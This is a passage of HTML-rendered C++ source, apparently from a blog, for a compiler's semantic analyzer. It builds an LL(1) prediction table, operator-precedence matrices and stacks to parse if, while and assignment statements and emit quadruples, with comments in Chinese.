&gt;</span></span><br><span class="line"><span class="comment">            - &gt; &gt; &lt; &lt; &lt; &gt; &gt;</span></span><br><span class="line"><span class="comment">            * &gt; &gt; &gt; &gt; &lt; &gt; &gt;</span></span><br><span class="line"><span class="comment">            / &gt; &gt; &gt; &gt; &lt; &gt; &gt;</span></span><br><span class="line"><span class="comment">            ( &lt; &lt; &lt; &lt; &lt; = x</span></span><br><span class="line"><span class="comment">            ) &gt; &gt; &gt; &gt; x &gt; &gt;</span></span><br><span class="line"><span class="comment">            # &lt; &lt; &lt; &lt; &lt; x =</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">        <span class="type">const</span> <span class="type">int</span> opl[<span class="number">5</span>][<span class="number">5</span>]=&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">2</span>, <span class="number">0</span>&#125;;  <span class="comment">//operatorPriority</span></span><br><span class="line">        <span class="comment">//运算符顺序:&#x27;&amp;&amp;&#x27;,&#x27;||&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;#&#x27; 1表示大于，0等于，-1小于,2非法</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">              &amp; | ( ) #</span></span><br><span class="line"><span class="comment">            &amp; &gt; &gt; &lt; &gt; &gt;</span></span><br><span class="line"><span class="comment">            | &lt; &gt; &lt; &gt; &gt;</span></span><br><span class="line"><span class="comment">            ( &lt; &lt; &lt; = x</span></span><br><span class="line"><span class="comment">            ) x x x x x</span></span><br><span class="line"><span class="comment">            # &lt; &lt; &lt; x =</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; S;</span><br><span class="line"></span><br><span class="line">        stack&lt;string&gt; calcNS;   <span class="comment">// 算术表达式操作数栈</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; calcOpS;   <span class="comment">// 算术表达式运算符栈</span></span><br><span class="line"></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; locNS;   <span class="comment">// 关系表达式操作数栈</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; locOpS;   <span class="comment">// 关系表达式运算符栈</span></span><br><span class="line"></span><br><span class="line">        stack&lt;string&gt; NS;     <span class="comment">// 关系运算操作数栈</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; opS;     <span class="comment">// 关系运算符号栈</span></span><br><span class="line"></span><br><span class="line">        stack&lt;Chain&gt; CS;    <span class="comment">// ChainStack</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; WS;      <span class="comment">// while首位栈</span></span><br><span class="line">        stack&lt;pair&lt;<span class="type">int</span>, string&gt;&gt; tdS;     <span class="comment">// 跳转待定栈</span></span><br><span class="line"></span><br><span class="line">        stack&lt;vector&lt;<span class="type">int</span>&gt;&gt; cirS;    <span class="comment">// 递归栈,V[层数（栈中元素个数替代）， 标记种类， 特殊位置标记]</span></span><br><span class="line">        map&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;<span class="type">int</span>&gt;&gt; init;  <span class="comment">// 预测表</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; typeV;</span><br><span class="line">        vector&lt;string&gt; strV;</span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; V4; <span class="comment">// 四元式存储</span></span><br><span class="line">        <span class="type">int</span> flag;</span><br><span class="line">        <span class="type">int</span> ops;    <span class="comment">// 临时操作数计数</span></span><br><span class="line">        <span class="type">int</span> lFlag;  <span class="comment">// 排除关系语句的首个关系式</span></span><br><span class="line">        <span class="type">int</span> rFlag;  <span class="comment">// 寻找赋值语句的首个变量</span></span><br><span class="line">        <span class="type">int</span> tFlag;  <span class="comment">// 寻找首层算术表达式</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">semanticAnalyzer</span>(vector&lt;<span class="type">int</span>&gt; tv, vector&lt;string&gt; sv):<span class="built_in">typeV</span>(tv), <span class="built_in">strV</span>(sv)&#123;  <span class="comment">// 初始化预测表</span></span><br><span class="line">            typeV.<span class="built_in">push_back</span>(<span class="number">0</span>);   <span class="comment">// 终止符#外标记为0，内标记为-1</span></span><br><span class="line">            strV.<span class="built_in">push_back</span>(<span class="string">&quot;#&quot;</span>);   <span class="comment">// 终止符#外标记为0，内标记为-1</span></span><br><span class="line">            locOpS.<span class="built_in">push</span>(<span class="number">0</span>); <span class="comment">// 起止符# 0</span></span><br><span class="line">            opS.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">            CS.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);    <span class="comment">// 底层Chain</span></span><br><span class="line">            cirS.<span class="built_in">push</span>(&#123;<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;);    <span class="comment">// 垫底</span></span><br><span class="line">            tFlag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// LL(1) 转移表</span></span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">100</span>, <span class="number">0</span>, &#123;<span class="number">101</span>,<span class="number">50</span>,<span class="number">44</span>,<span class="number">0</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">101</span>, <span class="number">1</span>, &#123;<span class="number">51</span>,<span class="number">5</span>,<span class="number">106</span>,<span class="number">4</span>,<span class="number">102</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">102</span>, <span class="number">1</span>, &#123;<span class="number">103</span>,<span class="number">1</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">103</span>, <span class="number">44</span>, &#123;<span class="number">124</span>,<span class="number">50</span>,<span class="number">104</span>,<span class="number">53</span>,<span class="number">105</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">104</span>, <span class="number">2</span>, &#123;<span class="number">2</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">104</span>, <span class="number">3</span>, &#123;<span class="number">3</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">105</span>, <span class="number">44</span>, &#123;<span class="number">125</span>,<span class="number">121</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">106</span>, &#123;<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">44</span>&#125;, &#123;<span class="number">126</span>,<span class="number">107</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">107</span>, <span class="number">4</span>, &#123;<span class="number">111</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">107</span>, <span class="number">6</span>, &#123;<span class="number">109</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">107</span>, <span class="number">9</span>, &#123;<span class="number">110</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">107</span>, <span class="number">4</span>, &#123;<span class="number">111</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">107</span>, <span class="number">44</span>, &#123;<span class="number">108</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">108</span>, <span class="number">44</span>, &#123;<span class="number">112</span>,<span class="number">30</span>,<span class="number">121</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">109</span>, <span class="number">6</span>, &#123;<span class="number">129</span>,<span class="number">107</span>,<span class="number">7</span>,<span class="number">120</span>,<span class="number">6</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">110</span>, <span class="number">9</span>, &#123;<span class="number">107</span>,<span class="number">10</span>,<span class="number">120</span>,<span class="number">9</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">111</span>, <span class="number">4</span>, &#123;<span class="number">5</span>,<span class="number">106</span>,<span class="number">4</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">112</span>, &#123;<span class="number">40</span>,<span class="number">41</span>,<span class="number">44</span>&#125;, &#123;<span class="number">113</span>,<span class="number">116</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">113</span>, &#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">31</span>,<span class="number">32</span>&#125;, &#123;<span class="number">128</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">113</span>, &#123;<span class="number">20</span>,<span class="number">21</span>&#125;, &#123;<span class="number">114</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">114</span>, &#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">31</span>,<span class="number">32</span>&#125;, &#123;<span class="number">128</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">114</span>, &#123;<span class="number">20</span>,<span class="number">21</span>&#125;, &#123;<span class="number">114</span>,<span class="number">115</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">115</span>, <span class="number">20</span>, &#123;<span class="number">116</span>,<span class="number">20</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">115</span>, <span class="number">21</span>, &#123;<span class="number">116</span>,<span class="number">21</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">116</span>, &#123;<span class="number">40</span>,<span class="number">41</span>,<span class="number">44</span>,<span class="number">54</span>&#125;, &#123;<span class="number">127</span>,<span class="number">119</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">117</span>, &#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">31</span>,<span class="number">32</span>&#125;, &#123;<span class="number">128</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">117</span>, &#123;<span class="number">22</span>,<span class="number">23</span>&#125;, &#123;<span class="number">117</span>,<span class="number">118</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">118</span>, <span class="number">22</span>, &#123;<span class="number">119</span>,<span class="number">22</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">118</span>, <span class="number">23</span>, &#123;<span class="number">119</span>,<span class="number">23</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">119</span>, &#123;<span class="number">40</span>,<span class="number">41</span>&#125;, &#123;<span class="number">122</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">119</span>, <span class="number">44</span>, &#123;<span class="number">121</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">119</span>, <span class="number">54</span>, &#123;<span class="number">55</span>,<span class="number">112</span>,<span class="number">54</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">120</span>, &#123;<span class="number">40</span>,<span class="number">41</span>,<span class="number">44</span>,<span class="number">54</span>&#125;, &#123;<span class="number">131</span>,<span class="number">130</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">121</span>, <span class="number">44</span>, &#123;<span class="number">44</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">122</span>, <span class="number">40</span>, &#123;<span class="number">40</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">122</span>, <span class="number">41</span>, &#123;<span class="number">41</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">24</span>, &#123;<span class="number">24</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">25</span>, &#123;<span class="number">25</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">26</span>, &#123;<span class="number">26</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">27</span>, &#123;<span class="number">27</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">28</span>, &#123;<span class="number">28</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">123</span>, <span class="number">29</span>, &#123;<span class="number">29</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">124</span>, <span class="number">4</span>, &#123;<span class="number">128</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">125</span>, <span class="number">52</span>, &#123;<span class="number">105</span>,<span class="number">52</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">125</span>, <span class="number">53</span>, &#123;<span class="number">128</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">126</span>, <span class="number">5</span>, &#123;<span class="number">128</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">126</span>, <span class="number">50</span>, &#123;<span class="number">106</span>,<span class="number">50</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">127</span>, &#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">31</span>,<span class="number">32</span>&#125;, &#123;<span class="number">128</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">127</span>, &#123;<span class="number">22</span>,<span class="number">23</span>&#125;, &#123;<span class="number">117</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">129</span>, <span class="number">8</span>, &#123;<span class="number">107</span>,<span class="number">8</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">129</span>, &#123;<span class="number">50</span>, <span class="number">5</span>&#125;, &#123;<span class="number">128</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">130</span>, &#123;<span class="number">40</span>,<span class="number">41</span>,<span class="number">44</span>,<span class="number">54</span>&#125;, &#123;<span class="number">112</span>, <span class="number">123</span>, <span class="number">112</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">131</span>, &#123;<span class="number">31</span>,<span class="number">32</span>&#125;, &#123;<span class="number">120</span>,<span class="number">132</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">131</span>, &#123;<span class="number">10</span>, <span class="number">7</span>&#125;, &#123;<span class="number">128</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">132</span>, <span class="number">31</span>, &#123;<span class="number">31</span>&#125;);</span><br><span class="line">            <span class="built_in">buildMap</span>(<span class="number">132</span>, <span class="number">32</span>, &#123;<span class="number">32</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">buildMap</span><span class="params">(<span class="type">int</span> a, vector&lt;<span class="type">int</span>&gt; s, vector&lt;<span class="type">int</span>&gt; V)</span></span>&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">            <span class="type">int</span> len = V.<span class="built_in">size</span>(), lens = s.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                v.<span class="built_in">push_back</span>(V[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j&lt;lens; j++)&#123;</span><br><span class="line">                <span class="function">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">p</span><span class="params">(a, s[j])</span></span>;</span><br><span class="line">                <span class="keyword">if</span>(init.<span class="built_in">count</span>(p)) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 重复定义</span></span><br><span class="line">                init[p]=v;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">buildMap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, vector&lt;<span class="type">int</span>&gt; V)</span></span>&#123;</span><br><span class="line">            <span class="type">int</span> len = V.<span class="built_in">size</span>();</span><br><span class="line">            <span class="function">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">p</span><span class="params">(a, b)</span></span>;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                v.<span class="built_in">push_back</span>(V[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            init[p]=v;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isVT</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(n&gt;=<span class="number">100</span> &amp;&amp; n!=<span class="number">128</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">128</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">getPush</span><span class="params">(vector&lt;<span class="type">int</span>&gt; V)</span></span>&#123;        <span class="comment">// 逐个入栈</span></span><br><span class="line">            <span class="type">int</span> len = V.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                S.<span class="built_in">push</span>(V[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">analyze</span><span class="params">()</span></span>&#123;</span><br><span class="line">            V4.<span class="built_in">resize</span>(<span class="number">0</span>);   <span class="comment">// 清空四元式存储</span></span><br><span class="line">            ops = <span class="number">1</span>;    <span class="comment">// 临时操作数从1开始</span></span><br><span class="line">            S.<span class="built_in">push</span>(<span class="number">-1</span>);     <span class="comment">// 终止符</span></span><br><span class="line">            S.<span class="built_in">push</span>(<span class="number">100</span>);      <span class="comment">// 起始符A</span></span><br><span class="line">            cirS.<span class="built_in">push</span>(&#123;<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;);</span><br><span class="line">            V4.<span class="built_in">push_back</span>(&#123;<span class="string">&quot;none&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> len = typeV.<span class="built_in">size</span>(), c=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(!S.<span class="built_in">empty</span>() &amp;&amp; c&lt;len)&#123;</span><br><span class="line">                <span class="type">int</span> tmp = S.<span class="built_in">top</span>();</span><br><span class="line">                string tmpS = strV[c];</span><br><span class="line">                S.<span class="built_in">pop</span>();    <span class="comment">// 当前符号出栈</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isVT</span>(tmp))&#123;  <span class="comment">// 非终结符</span></span><br><span class="line">                    <span class="function">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">tmpP</span><span class="params">(tmp, getMinus(typeV, c))</span></span>;</span><br><span class="line">                    <span class="keyword">if</span>(init.<span class="built_in">count</span>(tmpP)==<span class="number">0</span>)&#123;    <span class="comment">// 语法错误</span></span><br><span class="line">                        <span class="comment">// printf(&quot;false with unknown: %d (%d,%s)&quot;, tmp, typeV[c]-1, strV[c].c_str());</span></span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;syntax error.&quot;</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    vector&lt;<span class="type">int</span>&gt; tmpV = init[tmpP];</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">109</span>)&#123;     <span class="comment">// 条件语句</span></span><br><span class="line">                        <span class="built_in">addChain</span>();</span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">1</span>, <span class="number">0</span>&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">120</span> &amp;&amp; <span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>) == <span class="number">6</span>)&#123; <span class="comment">// if后面的关系表达式</span></span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">2</span>, <span class="number">0</span>&#125;);</span><br><span class="line">                        locOpS.<span class="built_in">push</span>(<span class="number">0</span>);     <span class="comment">// 起止符标记关系表达式开始</span></span><br><span class="line">                        lFlag = <span class="number">1</span>;  <span class="comment">// l标记</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">107</span> &amp;&amp; <span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>) == <span class="number">7</span>)&#123; <span class="comment">// 准备进入then后面的语句</span></span><br><span class="line">                        <span class="built_in">linkUpV4</span>(<span class="built_in">getTC</span>(), <span class="built_in">to_string</span>(V4.<span class="built_in">size</span>()));</span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">3</span>, <span class="number">0</span>&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">107</span> &amp;&amp; <span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>) == <span class="number">8</span>)&#123;   <span class="comment">// else后的语句</span></span><br><span class="line">                        <span class="comment">// FC跳转</span></span><br><span class="line">                        <span class="built_in">upChain</span>(V4.<span class="built_in">size</span>(), <span class="number">-1</span>);</span><br><span class="line">                        <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;-1&quot;</span>&#125;);</span><br><span class="line">                        <span class="built_in">upV4</span>(<span class="built_in">getFC</span>(), <span class="number">3</span>, <span class="built_in">to_string</span>(V4.<span class="built_in">size</span>()));  <span class="comment">// 有else则多了一行，FC后移一个</span></span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">4</span>, <span class="number">0</span>&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">130</span>)&#123;     <span class="comment">// 子关系表达式</span></span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">5</span>, <span class="number">0</span>&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">112</span> &amp;&amp; tFlag == <span class="number">1</span>)&#123;     <span class="comment">// 第一层算术表达式</span></span><br><span class="line">                        tFlag = <span class="number">0</span>;  </span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">6</span>, c&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">110</span>)&#123;     <span class="comment">// while语句</span></span><br><span class="line">                        <span class="built_in">addChain</span>();</span><br><span class="line">                        WS.<span class="built_in">push</span>(V4.<span class="built_in">size</span>());</span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">7</span>, <span class="number">0</span>&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">120</span> &amp;&amp; <span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>) == <span class="number">9</span>)&#123; <span class="comment">// while后面的关系表达式</span></span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">8</span>, <span class="number">0</span>&#125;);</span><br><span class="line">                        locOpS.<span class="built_in">push</span>(<span class="number">0</span>);     <span class="comment">// 起止符标记关系表达式开始</span></span><br><span class="line">                        lFlag = <span class="number">1</span>;  <span class="comment">// l标记</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">107</span> &amp;&amp; <span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>) == <span class="number">10</span>)&#123; <span class="comment">// do后的语句</span></span><br><span class="line">                        <span class="built_in">linkUpV4</span>(<span class="built_in">getTC</span>(), <span class="built_in">to_string</span>(V4.<span class="built_in">size</span>()));</span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">9</span>, <span class="number">0</span>&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">100</span>)&#123;     <span class="comment">// 起始符号</span></span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">0</span>, <span class="number">0</span>&#125;);   <span class="comment">// 始末标记</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">108</span>)&#123;     <span class="comment">// 赋值语句</span></span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">10</span>, <span class="number">0</span>&#125;);  </span><br><span class="line">                        rFlag = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="number">121</span> &amp;&amp; rFlag)&#123;    <span class="comment">// 赋值语句后的变量</span></span><br><span class="line">                        cirS.<span class="built_in">push</span>(&#123;<span class="built_in">int</span>(S.<span class="built_in">size</span>()), <span class="number">11</span>, <span class="number">0</span>&#125;);</span><br><span class="line">                        rFlag = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">getPush</span>(tmpV);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 终结符或空</span></span><br><span class="line">                    <span class="keyword">if</span>(!<span class="built_in">isEmpty</span>(tmp) &amp;&amp; tmp!=<span class="built_in">getMinus</span>(typeV, c))&#123;    <span class="comment">// 不为空才算语法错误</span></span><br><span class="line">                        <span class="comment">// printf(&quot;false with: %d (%d,%s)&quot;, tmp, typeV[c]-1, strV[c].c_str());</span></span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;syntax error.&quot;</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// printf(&quot;true: (%d,%s)\n&quot;, typeV[c]-1, strV[c].c_str());</span></span><br><span class="line">                        <span class="keyword">if</span>(!<span class="built_in">isEmpty</span>(tmp))   <span class="comment">// 不为空才迭代</span></span><br><span class="line">                            ++c;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                        vector&lt;<span class="type">int</span>&gt; tmpV = cirS.<span class="built_in">top</span>();  <span class="comment">// 取出顶部标识</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>) &gt;=<span class="number">24</span> &amp;&amp; <span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>) &lt;= <span class="number">29</span>)&#123;  <span class="comment">// 关系运算符</span></span><br><span class="line">                            opS.<span class="built_in">push</span>(<span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>));    <span class="comment">// 入栈</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>) == <span class="number">31</span> || <span class="built_in">getMinus</span>(typeV, c<span 